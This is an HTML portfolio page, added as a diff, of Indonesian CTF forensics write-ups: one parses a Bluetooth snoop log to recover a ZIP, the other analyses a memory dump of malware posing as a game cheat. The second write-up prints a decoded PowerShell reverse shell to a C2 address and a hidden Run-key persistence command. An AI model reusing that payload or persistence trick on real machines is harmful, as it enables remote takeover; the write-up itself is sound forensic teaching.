@@ -1,0 +1,1074 @@
+<!DOCTYPE html>
+<html lang="indonesian">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Capture The Flag (CTF) Writeups oleh Samuel (JustSEMI). Analisis mendalam tantangan keamanan siber, forensik memori, log bluetooth, dan malware.">
+    <meta name="keywords" content="CTF, Writeups, Cyber Security, Forensik, Memory Dump, Bluetooth HCI, JustSEMI, Samuel, PlayIT 2026">
+    <meta name="author" content="Samuel">
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://me.sfht.space/ctf.html">
+    <meta property="og:title" content="CTF Writeups | СЕМИ">
+    <meta property="og:description" content="Capture The Flag (CTF) Writeups oleh Samuel (JustSEMI). Analisis mendalam tantangan keamanan siber, forensik memori, log bluetooth, dan malware.">
+    <!-- Twitter -->
+    <meta property="twitter:card" content="summary_large_image">
+    <meta property="twitter:url" content="https://me.sfht.space/ctf.html">
+    <meta property="twitter:title" content="CTF Writeups | СЕМИ">
+    <meta property="twitter:description" content="Capture The Flag (CTF) Writeups oleh Samuel (JustSEMI). Analisis mendalam tantangan keamanan siber, forensik memori, log bluetooth, dan malware.">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link rel="stylesheet"
+        href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;700&display=swap">
+    <link rel="stylesheet" href="https://unpkg.com/lenis@1.3.23/dist/lenis.css">
+    <link rel="stylesheet" href="https://unpkg.com/aos@2.3.1/dist/aos.css">
+    <link rel="stylesheet" href="css/global.css">
+    <link rel="stylesheet" href="css/ctf.css">
+    <title>CTF Writeups | СЕМИ</title>
+</head>
+
+<body class="dark-mode ctf-page">
+
+
+
+    <!-- Header Navigation -->
+    <header class="ctf-header-container">
+        <div class="ctf-back-nav" data-aos="fade-down">
+            <a href="index.html" class="btn-back-home">
+                <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.5"
+                    stroke-linecap="round" stroke-linejoin="round">
+                    <line x1="19" y1="12" x2="5" y2="12"></line>
+                    <polyline points="12 19 5 12 12 5"></polyline>
+                </svg>
+                Kembali ke Beranda
+            </a>
+        </div>
+        <div class="ctf-title-wrap" data-aos="fade-down" data-aos-delay="100">
+            <h1>Capture The Flag</h1>
+            <p class="subtitle">oprexz@justsemi:~/ctf/writeups$ ls -la</p>
+        </div>
+    </header>
+
+    <!-- Stats Section -->
+    <section class="ctf-stats-grid" data-aos="fade-up" data-aos-delay="200">
+        <!-- Stat Card 1 -->
+        <div class="ctf-stat-card">
+            <div class="ctf-stat-icon">
+                <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" stroke-width="2"
+                    stroke-linecap="round" stroke-linejoin="round">
+                    <polyline points="22 12 18 12 15 21 9 3 6 12 2 12"></polyline>
+                </svg>
+            </div>
+            <div class="ctf-stat-info">
+                <span class="ctf-stat-value" id="stats-solved">0</span>
+                <span class="ctf-stat-label">Total Solved</span>
+            </div>
+        </div>
+
+
+        <!-- Stat Card 3 -->
+        <div class="ctf-stat-card">
+            <div class="ctf-stat-icon">
+                <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" stroke-width="2"
+                    stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
+                </svg>
+            </div>
+            <div class="ctf-stat-info">
+                <span class="ctf-stat-value">Forensics</span>
+                <span class="ctf-stat-label">Primary Specialty</span>
+            </div>
+        </div>
+
+        <!-- Stat Card 4 -->
+        <div class="ctf-stat-card">
+            <div class="ctf-stat-icon">
+                <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" stroke-width="2"
+                    stroke-linecap="round" stroke-linejoin="round">
+                    <polygon points="12 2 2 7 12 12 22 7 12 2"></polygon>
+                    <polyline points="2 17 12 22 22 17"></polyline>
+                    <polyline points="2 12 12 17 22 12"></polyline>
+                </svg>
+            </div>
+            <div class="ctf-stat-info">
+                <span class="ctf-stat-value">PlayIT 2026</span>
+                <span class="ctf-stat-label">Latest CTF Event</span>
+            </div>
+        </div>
+    </section>
+
+    <!-- Main Content Grid -->
+    <main class="ctf-layout-container">
+        <!-- Sidebar -->
+        <aside class="ctf-sidebar" data-aos="fade-right" data-aos-delay="300">
+            <!-- Profile Info Widget -->
+            <div class="ctf-profile-header">
+                <div class="ctf-profile-user">
+                    <div class="ctf-profile-avatar">S</div>
+                    <div>
+                        <span class="ctf-profile-name">Samuel (oprexz)</span>
+                        <span class="ctf-profile-handle">@JustSEMI</span>
+                    </div>
+                </div>
+                <div class="ctf-platform-links">
+                    <a href="#" target="_blank" class="platform-badge htb">CTF Polije</a>
+                </div>
+            </div>
+
+            <h2 class="ctf-sidebar-title">
+                <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.5"
+                    stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M4 19.5A2.5 2.5 0 0 1 6.5 17H20"></path>
+                    <path d="M6.5 2H20v20H6.5A2.5 2.5 0 0 1 4 19.5v-15A2.5 2.5 0 0 1 6.5 2z"></path>
+                </svg>
+                Writeups List
+            </h2>
+            <div class="ctf-list" id="ctf-list">
+                <!-- Javascript will populate this list -->
+                <div class="loading-spinner" style="margin: 20px auto;">Memuat daftar tantangan...</div>
+            </div>
+        </aside>
+
+        <!-- Writeup Viewer -->
+        <section class="ctf-viewer-card" data-aos="fade-left" data-aos-delay="300">
+            <!-- Terminal Header -->
+            <div class="terminal-header">
+                <div class="terminal-left">
+                    <div class="terminal-dots">
+                        <span class="terminal-dot red"></span>
+                        <span class="terminal-dot yellow"></span>
+                        <span class="terminal-dot green"></span>
+                    </div>
+                    <div class="terminal-title" id="terminal-title">
+                        <svg viewBox="0 0 24 24" width="12" height="12" fill="none" stroke="currentColor" stroke-width="2.5"
+                            stroke-linecap="round" stroke-linejoin="round">
+                            <polyline points="4 17 10 11 4 5"></polyline>
+                            <line x1="12" y1="19" x2="20" y2="19"></line>
+                        </svg>
+                        <span>hacker@terminal:~$</span>
+                    </div>
+                </div>
+                <div class="terminal-controls">
+                    <button class="terminal-btn" title="Toggle Font Size" id="btn-zoom">
+                        <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2"
+                            stroke-linecap="round" stroke-linejoin="round">
+                            <circle cx="11" cy="11" r="8"></circle>
+                            <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
+                            <line x1="11" y1="8" x2="11" y2="14"></line>
+                            <line x1="8" y1="11" x2="14" y2="11"></line>
+                        </svg>
+                    </button>
+                    <button class="terminal-btn" title="Kembali ke atas" id="btn-scroll-top">
+                        <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2"
+                            stroke-linecap="round" stroke-linejoin="round">
+                            <polyline points="18 15 12 9 6 15"></polyline>
+                        </svg>
+                    </button>
+                </div>
+            </div>
+
+            <!-- Terminal Body Viewport -->
+            <div id="ctf-viewer-body" class="ctf-empty-state">
+                <div class="ctf-empty-icon">
+                    <svg viewBox="0 0 24 24" width="64" height="64" fill="none" stroke="currentColor" stroke-width="1.5"
+                        stroke-linecap="round" stroke-linejoin="round">
+                        <polyline points="4 17 10 11 4 5"></polyline>
+                        <line x1="12" y1="19" x2="20" y2="19"></line>
+                    </svg>
+                </div>
+                <h3>Pilih Writeup</h3>
+                <p>Pilih salah satu tantangan dari daftar di sebelah kiri untuk membaca Writeup penyelesaian.</p>
+            </div>
+        </section>
+    </main>
+
+    <!-- Global Music Player Widget (Included for consistency) -->
+    <div id="music-widget" class="music-widget">
+        <button id="music-close-btn" class="music-close-btn" aria-label="Sembunyikan Pemutar Musik" title="Sembunyikan">
+            <svg viewBox="0 0 24 24" width="12" height="12" fill="none" stroke="currentColor" stroke-width="2.5"
+                stroke-linecap="round" stroke-linejoin="round">
+                <line x1="18" y1="6" x2="6" y2="18"></line>
+                <line x1="6" y1="6" x2="18" y2="18"></line>
+            </svg>
+        </button>
+        <div class="music-disc-container">
+            <div class="music-disc">
+                <svg viewBox="0 0 24 24" width="18" height="18" fill="currentColor">
+                    <circle cx="12" cy="12" r="10" fill="none" stroke="currentColor" stroke-width="1.5" />
+                    <circle cx="12" cy="12" r="6" fill="none" stroke="currentColor" stroke-width="1.5" />
+                    <circle cx="12" cy="12" r="2" fill="currentColor" />
+                </svg>
+            </div>
+        </div>
+        <div class="music-info">
+            <span class="music-status">NOW PLAYING</span>
+            <span id="music-title" class="music-title">Loading Track...</span>
+            <span id="music-artist" class="music-artist">JustSEMI Choice</span>
+        </div>
+        <div class="music-controls">
+            <button id="music-prev-btn" class="music-control-btn" aria-label="Lagu Sebelumnya" title="Sebelumnya">
+                <svg viewBox="0 0 24 24" width="14" height="14" fill="currentColor">
+                    <path d="M6 6h2v12H6zm3.5 6l8.5 6V6z" />
+                </svg>
+            </button>
+            <button id="music-play-btn" class="music-control-btn" aria-label="Play/Pause" title="Putar/Jeda">
+                <svg id="music-play-icon" viewBox="0 0 24 24" width="16" height="16" fill="currentColor">
+                    <path d="M8 5v14l11-7z" />
+                </svg>
+                <svg id="music-pause-icon" style="display: none;" viewBox="0 0 24 24" width="16" height="16"
+                    fill="currentColor">
+                    <path d="M6 19h4V5H6v14zm8-14v14h4V5h-4z" />
+                </svg>
+            </button>
+            <button id="music-next-btn" class="music-control-btn" aria-label="Lagu Selanjutnya" title="Selanjutnya">
+                <svg viewBox="0 0 24 24" width="14" height="14" fill="currentColor">
+                    <path d="M6 18l8.5-6L6 6zm9-12h2v12h-2z" />
+                </svg>
+            </button>
+        </div>
+        <div class="music-visualizer">
+            <div class="bar"></div>
+            <div class="bar"></div>
+            <div class="bar"></div>
+            <div class="bar"></div>
+        </div>
+    </div>
+
+    <button id="music-toggle-btn" class="music-toggle-btn" aria-label="Tampilkan Pemutar Musik" title="Tampilkan">
+        <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2"
+            stroke-linecap="round" stroke-linejoin="round" class="music-note-icon">
+            <path d="M9 18V5l12-2v13"></path>
+            <circle cx="6" cy="18" r="3"></circle>
+            <circle cx="18" cy="16" r="3"></circle>
+        </svg>
+    </button>
+
+    <!-- Global Theme Switcher & XRay Mode -->
+    <button id="theme-toggle" class="theme-toggle" aria-label="Ganti Tema">
+        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+            stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="moon-icon">
+            <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+        </svg>
+    </button>
+
+    <div id="xray-trigger" title="Toggle Blueprint Mode">
+        <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" stroke-width="1.5"
+            stroke-linecap="round" stroke-linejoin="round">
+            <polygon points="12 2 2 7 12 12 22 7 12 2" />
+            <polyline points="2 17 12 22 22 17" />
+            <polyline points="2 12 12 17 22 12" />
+        </svg>
+    </div>
+
+    <!-- External libraries -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/vanilla-tilt/1.8.1/vanilla-tilt.min.js"></script>
+    <script src="https://unpkg.com/lenis@1.3.23/dist/lenis.min.js"></script>
+    <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
+    <script>
+        if (typeof AOS !== 'undefined') {
+            AOS.init({
+                duration: 800,
+                once: true,
+                offset: 100
+            });
+        }
+    </script>
+    <!-- Include global application bootloader -->
+    <script src="js/app.boot.js?v=2.0.4"></script>
+
+    <!-- Page Specific Script for Dynamic Writeup Explorer -->
+    <script>
+        (function() {
+            const listContainer = document.getElementById('ctf-list');
+            const viewerBody = document.getElementById('ctf-viewer-body');
+            const terminalTitle = document.getElementById('terminal-title').querySelector('span');
+            const statsSolved = document.getElementById('stats-solved');
+            const btnZoom = document.getElementById('btn-zoom');
+            const btnScrollTop = document.getElementById('btn-scroll-top');
+
+            // Offline Fallbacks for file:// protocol
+            const fallbackData = [
+  {
+    "id": "besik-poren",
+    "title": "Besik Poren",
+    "event": "PlayIT Cyber Combat 2026",
+    "category": "Forensics",
+    "difficulty": "Easy",
+    "points": 50,
+    "file": "Besik_Poren.md",
+    "date": "24 Mei 2026",
+    "flag": "PLAYIT{}",
+    "description": "Tantangan analisis Bluetooth HCI Snoop Log (format btsnoop/pcap) untuk merekonstruksi file PDF terenkripsi (zip) yang dikirim via Bluetooth."
+  },
+  {
+    "id": "league-of-the-legend",
+    "title": "League of the Legend",
+    "event": "PlayIT Cyber Combat 2026",
+    "category": "Forensics",
+    "difficulty": "Medium",
+    "points": 100,
+    "file": "League_of_the_Legend.md",
+    "date": "24 Mei 2026",
+    "flag": "PLAYIT{}",
+    "description": "Analisis Windows Memory Dump dan Registry NTUSER.DAT untuk menyelidiki infeksi malware yang menyamar sebagai cheat game League of Legends."
+  }
+];
+
+            const markdownFallbacks = {
+                "besik-poren": `# Writeup CTF - Besik_Poren
+
+## Deskripsi Tantangan
+Tantangan kategori Forensik dengan nama **Besik_Poren** (Easy, 50 poin). Deskripsi tantangan menyebutkan bahwa pembuat tantangan tidak memiliki kuota internet, sehingga pengiriman file dilakukan seperti pada tahun 2015 (menggunakan Bluetooth). File tantangan yang disediakan bernama \`dist\`.
+
+---
+
+## Langkah Penyelesaian
+
+### 1. Analisis Awal File \`dist\`
+Langkah pertama adalah memeriksa jenis file dari \`dist\` dengan membaca magic bytes (header file) menggunakan script Python berikut:
+
+\`\`\`python
+with open('dist', 'rb') as f:
+    print(f.read(16))
+\`\`\`
+
+Hasil pembacaan 16 byte pertama:
+\`b'btsnoop\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x03\\xea'\`
+
+
+Magic bytes \`btsnoop\\x00\` menunjukkan bahwa file tersebut adalah **Bluetooth HCI Snoop Log** (Format pcap khusus Bluetooth).
+
+---
+
+### 2. Menganalisis Protokol dan Ekstraksi Stream
+Di dalam log Bluetooth tersebut terdapat aktivitas transfer file. Protokol standar yang digunakan untuk transfer file via Bluetooth adalah **OBEX (Object Exchange)** yang berjalan di atas **RFCOMM** dan **L2CAP**.
+
+Kami membuat script parser Python untuk melakukan langkah-langkah berikut:
+1. Melakukan reassembly pada fragmen-fragmen paket L2CAP.
+2. Melacak koneksi RFCOMM (PSM \`0x03\`) pada DLCI 8 (saluran data pengguna).
+3. Membaca data RFCOMM dengan memperhatikan credit-based flow control (jika control byte bernilai \`0xff\`, maka terdapat 1-byte credit tambahan sebelum payload).
+4. Menyusun kembali stream payload OBEX PUT.
+
+Berikut adalah script Python yang digunakan (\`parse_btsnoop.py\`):
+
+\`\`\`python
+import struct
+
+def parse_btsnoop_and_extract_file(file_path):
+    with open(file_path, 'rb') as f:
+        file_header = f.read(16)
+        if len(file_header) < 16:
+            return
+        
+        magic, version, datalink = struct.unpack('>8sII', file_header)
+        
+        active_rx = {}
+        active_tx = {}
+        cid_to_psm = {}
+        l2cap_packets = []
+        
+        while True:
+            header_bytes = f.read(24)
+            if len(header_bytes) < 24:
+                break
+            
+            orig_len, incl_len, flags, dropped, ts = struct.unpack('>IIIIQ', header_bytes)
+            payload = f.read(incl_len)
+            
+            if len(payload) == 0:
+                continue
+            
+            h4_type = payload[0]
+            if h4_type != 2: # HCI ACL Data
+                continue
+            
+            acl_data = payload[1:]
+            if len(acl_data) < 4:
+                continue
+                
+            handle_flags, total_len = struct.unpack('<HH', acl_data[:4])
+            handle = handle_flags & 0x0FFF
+            pb_flag = (handle_flags >> 12) & 0x03
+            data = acl_data[4:4+total_len]
+            
+            direction = "Rx" if (flags & 1) else "Tx"
+            reassembly_key = (direction, handle)
+            
+            if pb_flag == 2 or pb_flag == 0: # Start of L2CAP packet
+                if len(data) >= 4:
+                    l2cap_len, cid = struct.unpack('<HH', data[:4])
+                    l2cap_payload = data[4:]
+                    if len(l2cap_payload) >= l2cap_len:
+                        l2cap_packets.append((direction, handle, cid, l2cap_payload[:l2cap_len]))
+                    else:
+                        active_rx[reassembly_key] = (cid, l2cap_len, l2cap_payload)
+            elif pb_flag == 1: # Fragment
+                if reassembly_key in active_rx:
+                    cid, l2cap_len, accumulated = active_rx[reassembly_key]
+                    accumulated += data
+                    if len(accumulated) >= l2cap_len:
+                        l2cap_packets.append((direction, handle, cid, accumulated[:l2cap_len]))
+                        del active_rx[reassembly_key]
+                    else:
+                        active_rx[reassembly_key] = (cid, l2cap_len, accumulated)
+
+        for direction, handle, cid, payload in l2cap_packets:
+            if cid == 1: # Signaling
+                if len(payload) >= 4:
+                    code, ident, length = struct.unpack('<BBH', payload[:4])
+                    sig_data = payload[4:4+length]
+                    if code == 2: # Connection Request
+                        psm, scid = struct.unpack('<HH', sig_data[:4])
+                        cid_to_psm[(direction, handle, scid)] = psm
+                    elif code == 3: # Connection Response
+                        dcid, scid, result, status = struct.unpack('<HHHH', sig_data[:8])
+                        opp_direction = "Rx" if direction == "Tx" else "Tx"
+                        psm = cid_to_psm.get((opp_direction, handle, scid), None)
+                        if psm is not None:
+                            cid_to_psm[(direction, handle, dcid)] = psm
+                            cid_to_psm[(opp_direction, handle, scid)] = psm
+        
+        rfcomm_stream = bytearray()
+        for direction, handle, cid, payload in l2cap_packets:
+            psm = cid_to_psm.get((direction, handle, cid), None)
+            if psm == 3 and direction == "Tx": # RFCOMM data
+                if len(payload) < 4:
+                    continue
+                addr = payload[0]
+                control = payload[1]
+                dlci = addr >> 2
+                
+                if dlci == 8 and (control in (0xef, 0xff)):
+                    has_credit = (control == 0xff)
+                    len_byte1 = payload[2]
+                    if (len_byte1 & 1) == 1:
+                        rfcomm_len = len_byte1 >> 1
+                        data_start = 4 if has_credit else 3
+                    else:
+                        len_byte2 = payload[3]
+                        rfcomm_len = (len_byte1 >> 1) + (len_byte2 << 7)
+                        data_start = 5 if has_credit else 4
+                    
+                    rfcomm_data = payload[data_start : data_start + rfcomm_len]
+                    rfcomm_stream.extend(rfcomm_data)
+        
+        if len(rfcomm_stream) >= 3:
+            stream_idx = 0
+            while stream_idx < len(rfcomm_stream):
+                if stream_idx + 3 > len(rfcomm_stream):
+                    break
+                opcode, obex_len = struct.unpack('>BH', rfcomm_stream[stream_idx:stream_idx+3])
+                packet_data = rfcomm_stream[stream_idx : stream_idx + obex_len]
+                
+                header_start = 7 if opcode == 0x80 else 3
+                idx = header_start
+                body_data = bytearray()
+                file_name = "extracted_file"
+                
+                while idx < len(packet_data):
+                    if idx + 1 > len(packet_data):
+                        break
+                    header_id = packet_data[idx]
+                    header_type = header_id >> 6
+                    
+                    if header_type in (0, 1):
+                        if idx + 3 > len(packet_data):
+                            break
+                        header_len = struct.unpack('>H', packet_data[idx+1:idx+3])[0]
+                        value = packet_data[idx+3 : idx+header_len]
+                        
+                        if header_id == 0x01: # Name
+                            file_name = value.decode('utf-16be').rstrip('\\x00')
+                        elif header_id in (0x48, 0x49): # Body/End of Body
+                            body_data.extend(value)
+                        idx += header_len
+                    elif header_type == 2:
+                        idx += 2
+                    elif header_type == 3:
+                        idx += 5
+                
+                if len(body_data) > 0:
+                    with open(file_name, 'wb') as out_f:
+                        out_f.write(body_data)
+                    print(f"File {file_name} extracted.")
+                stream_idx += obex_len
+
+if __name__ == '__main__':
+    parse_btsnoop_and_extract_file('dist')
+\`\`\`
+
+
+Dari parsing OBEX PUT tersebut, terdeteksi metadata transfer sebagai berikut:
+- **Nama File**: \`chall.pdf\`
+- **Tipe Konten**: \`application/pdf\`
+- **Ukuran Body**: 3102 byte
+
+Setelah diekstrak, data biner file tersebut disimpan ke \`chall.pdf\`.
+
+---
+
+### 3. Pemeriksaan File Hasil Ekstraksi
+Ketika file \`chall.pdf\` diperiksa biner atau magic bytes-nya, ditemukan signature \`PK\\x03\\x04\` pada awal file. Signature ini menandakan bahwa file tersebut sebenarnya adalah file **ZIP**, bukan PDF asli.
+
+Daftar file di dalam arsip ZIP tersebut adalah:
+- \`flag.txt\` (Terenkripsi)
+- \`rahasia_programmer.txt\` (Terenkripsi)
+- \`.secret\` (Tidak Terenkripsi)
+
+---
+
+### 4. Membuka Proteksi ZIP
+Karena file \`.secret\` tidak terenkripsi, file tersebut dapat langsung diekstrak tanpa password.
+Isi dari file \`.secret\` adalah:
+\`poltec_soehat\`
+
+String \`poltec_soehat\` digunakan sebagai password untuk mengekstrak file \`flag.txt\` dan \`rahasia_programmer.txt\`. Proses ekstraksi berhasil sepenuhnya.
+
+Berikut adalah script Python yang digunakan untuk mengekstrak ZIP tersebut:
+
+\`\`\`python
+import zipfile
+
+# Buka file ZIP yang menyamar sebagai PDF
+with zipfile.ZipFile('chall.pdf') as z:
+    # Ekstrak file .secret yang tidak terenkripsi
+    z.extract('.secret', 'extracted_zip')
+    
+    # Ekstrak seluruh file menggunakan password dari .secret
+    z.extractall('extracted_zip', pwd=b'poltec_soehat')
+\`\`\`
+
+
+---
+
+### 5. Mendapatkan Flag
+Di dalam file \`flag.txt\` yang berhasil diekstrak, ditemukan flag untuk tantangan ini.
+`,
+                "league-of-the-legend": `# Writeup: League of the Legend (Forensics)
+
+Tantangan forensics ini mensimulasikan skenario di mana laptop seorang korban terinfeksi malware setelah menginstal cheat game League of Legends (LOL). Kita diberikan sebuah memory dump (\`memdump.mem\`) dan registry hive user (\`NTUSER.DAT\`) untuk dianalisis.
+
+Tantangan diselesaikan dengan menjawab serangkaian pertanyaan melalui kuis interaktif di \`nc 10.0.2.15 4453\`.
+
+---
+
+## 🔍 Analisis Langkah demi Langkah
+
+### 1. Nama Hostname Korban
+* **Pertanyaan**: Apa nama hostname dari komputer korban?
+* **Penyelesaian**: 
+  Kita dapat mencari nama hostname (\`COMPUTERNAME\`) langsung di dalam memory dump (\`memdump.mem\`). Melalui pencarian string mentah byte environment variable \`COMPUTERNAME=\`, kita menemukan:
+  \`\`\`text
+  COMPUTERNAME=DESKTOP-JU4Q97A
+  \`\`\`
+* **Jawaban**: \`DESKTOP-JU4Q97A\`
+
+---
+
+### 2. PID Proses PowerShell C2
+* **Pertanyaan**: Berapa PID dari powershell yang digunakan temannya untuk membuat koneksi c2?
+* **Penyelesaian**:
+  Gunakan plugin \`windows.netscan\` pada Volatility3 untuk melihat seluruh koneksi jaringan yang aktif:
+  \`\`\`bash
+  vol -f memdump/memdump.mem windows.netscan
+  \`\`\`
+  Di dalam output, ditemukan koneksi keluar mencurigakan ke port \`1337\` (port umum shell):
+  \`\`\`text
+  0x948ec777db50   TCPv4   192.168.100.10:55738   192.168.100.20:1337   ESTABLISHED   5032   powershell.exe
+  \`\`\`
+* **Jawaban**: \`5032\`
+
+---
+
+### 3. Parent PID dari PowerShell C2
+* **Pertanyaan**: Berapa Parent PID dari proses PowerShell mencurigakan yang terhubung ke C2?
+* **Penyelesaian**:
+  Gunakan plugin \`windows.pslist\` atau \`windows.pstree\` untuk melihat hierarki proses:
+  \`\`\`bash
+  vol -f memdump/memdump.mem windows.pslist
+  \`\`\`
+  Ditemukan proses powershell \`5032\` memiliki Parent PID (PPID) \`7420\`:
+  \`\`\`text
+  PID    PPID   ImageFileName
+  5032   7420   powershell.exe
+  \`\`\`
+* **Jawaban**: \`7420\`
+
+---
+
+### 4. IP:PORT Server C2
+* **Pertanyaan**: Apa IP:PORT server C2 yang terhubung dengan proses PowerShell mencurigakan?
+* **Penyelesaian**:
+  Berdasarkan data koneksi jaringan pada langkah kedua, alamat C2 adalah:
+* **Jawaban**: \`192.168.100.20:1337\`
+
+---
+
+### 5. Argumen Penyembunyian Window PowerShell
+* **Pertanyaan**: Kenapa proses powershell tidak nampak di layar utama desktop, apa argumen yang dia gunakan?
+* **Penyelesaian**:
+  Dengan membaca registry persistence atau memindai command line di memori, kita menemukan command line execution:
+  \`\`\`text
+  powershell.exe -WindowStyle Hidden -NonInteractive -EncodedCommand ...
+  \`\`\`
+  Argumen khusus yang digunakan untuk menyembunyikan window PowerShell agar tidak muncul di desktop adalah:
+* **Jawaban**: \`-WindowStyle Hidden\` *(Catatan: bersifat Case-Sensitive)*
+
+---
+
+### 6. Registry Path untuk Persistence
+* **Pertanyaan**: Apa full registry path yang digunakan untuk persistence?
+* **Penyelesaian**:
+  Analisis file \`NTUSER.DAT\` menggunakan library \`python-registry\` atau registry viewer pada key autorun/startup (\`Software\\Microsoft\\Windows\\CurrentVersion\\Run\`).
+  Ditemukan entri berikut:
+  - **Key**: \`SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\`
+  - **Value**: \`OneDriveUpdate\`
+  - **Data**: \`powershell.exe -WindowStyle Hidden -NonInteractive -EncodedCommand ...\`
+* **Jawaban**: \`HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDriveUpdate\`
+
+---
+
+### 7. Perintah Eksekusi Input C2
+* **Pertanyaan**: Command apa yang mengeksekusi input dari C2 pada payload?
+* **Penyelesaian**:
+  Payload Base64 yang ditemukan di registry di-decode dari UTF-16LE:
+  \`\`\`powershell
+  $client = New-Object System.Net.Sockets.TCPClient("192.168.100.20",1337);
+  $stream = $client.GetStream();
+  [byte[]]$bytes = 0..65535|%{0};
+  while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+      $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
+      $sendback = (iex $data 2>&1 | Out-String);
+      $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+      $stream.Write($sendbyte,0,$sendbyte.Length);
+      $stream.Flush()
+  };
+  $client.Close()
+  \`\`\`
+  Perintah yang mengeksekusi string \`$data\` (input dari C2) secara dinamis adalah \`iex\` (singkatan dari \`Invoke-Expression\`).
+* **Jawaban**: \`iex\`
+
+---
+
+### 8. Variabel Network Stream Koneksi C2
+* **Pertanyaan**: Variabel apa yang menyimpan network stream dari koneksi C2?
+* **Penyelesaian**:
+  Berdasarkan dekompilasi script di atas, variabel yang memegang network stream hasil dari \`$client.GetStream()\` adalah:
+* **Jawaban**: \`$stream\`
+
+---
+
+## 🛠️ Lampiran: Script Otomatisasi Solver (\`autopwn.py\`)
+
+Kita bisa menggunakan script python berikut untuk otomatis menjawab kuis interaktif secara instan:
+
+\`\`\`python
+import socket
+import time
+
+s = socket.socket()
+s.connect(('10.0.2.15', 4453))
+
+# Membaca greeting awal
+time.sleep(0.2)
+print(s.recv(4096).decode())
+
+# 1. Tekan ENTER untuk mulai
+s.sendall(b"\\n")
+time.sleep(0.2)
+print(s.recv(4096).decode())
+
+# 2. Kirim Hostname
+s.sendall(b"DESKTOP-JU4Q97A\\n")
+time.sleep(0.2)
+print(s.recv(4096).decode())
+
+# 3. Kirim PID
+s.sendall(b"5032\\n")
+time.sleep(0.2)
+print(s.recv(4096).decode())
+
+# 4. Kirim PPID
+s.sendall(b"7420\\n")
+time.sleep(0.2)
+print(s.recv(4096).decode())
+
+# 5. Kirim C2 IP:PORT
+s.sendall(b"192.168.100.20:1337\\n")
+time.sleep(0.2)
+print(s.recv(4096).decode())
+
+# 6. Kirim Hiding Argument
+s.sendall(b"-WindowStyle Hidden\\n")
+time.sleep(0.2)
+print(s.recv(4096).decode())
+
+# 7. Kirim Registry Path
+s.sendall(b"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\OneDriveUpdate\\n")
+time.sleep(0.2)
+print(s.recv(4096).decode())
+
+# 8. Kirim Command Executor
+s.sendall(b"iex\\n")
+time.sleep(0.2)
+print(s.recv(4096).decode())
+
+# 9. Kirim Stream Variable
+s.sendall(b"$stream\\n")
+time.sleep(0.5)
+print(s.recv(4096).decode('utf-8', errors='replace'))
+
+s.close()
+\`\`\`
+`
+            };
+
+            let writeupsData = [];
+            let isZoomed = false;
+
+            // Zoom Text logic
+            if (btnZoom) {
+                btnZoom.addEventListener('click', () => {
+                    const contentArea = document.querySelector('.ctf-writeup-view');
+                    if (contentArea) {
+                        isZoomed = !isZoomed;
+                        contentArea.style.fontSize = isZoomed ? '17px' : '15px';
+                        btnZoom.style.color = isZoomed ? 'var(--cyber-accent)' : '';
+                    }
+                });
+            }
+
+            // Scroll Top logic
+            if (btnScrollTop) {
+                btnScrollTop.addEventListener('click', () => {
+                    const contentArea = document.querySelector('.ctf-writeup-view');
+                    if (contentArea) {
+                        contentArea.scrollTo({ top: 0, behavior: 'smooth' });
+                    }
+                });
+            }
+
+            // Populate sidebar immediately with offline fallback data
+            writeupsData = fallbackData;
+            renderSidebar(fallbackData);
+            calculateStats(fallbackData);
+
+            // Fetch latest data from server to update
+            fetch('CTF/writeups.json')
+                .then(response => {
+                    if (!response.ok) throw new Error("Gagal mengambil writeups.json");
+                    return response.json();
+                })
+                .then(data => {
+                    if (data && Array.isArray(data) && data.length > 0) {
+                        writeupsData = data;
+                        renderSidebar(data);
+                        calculateStats(data);
+                    }
+                })
+                .catch(err => {
+                    console.warn("Gagal memperbarui daftar writeups dari server, menggunakan data lokal:", err);
+                });
+
+            // Calculate & Display Stats
+            function calculateStats(data) {
+                statsSolved.textContent = data.length;
+            }
+
+            // Render Sidebar grouped by event
+            function renderSidebar(data) {
+                listContainer.innerHTML = '';
+                
+                // Group data by event
+                const groups = {};
+                data.forEach(item => {
+                    if (!groups[item.event]) {
+                        groups[item.event] = [];
+                    }
+                    groups[item.event].push(item);
+                });
+
+                // Render each group
+                Object.keys(groups).forEach(eventName => {
+                    const groupEl = document.createElement('div');
+                    groupEl.className = 'ctf-event-group';
+                    
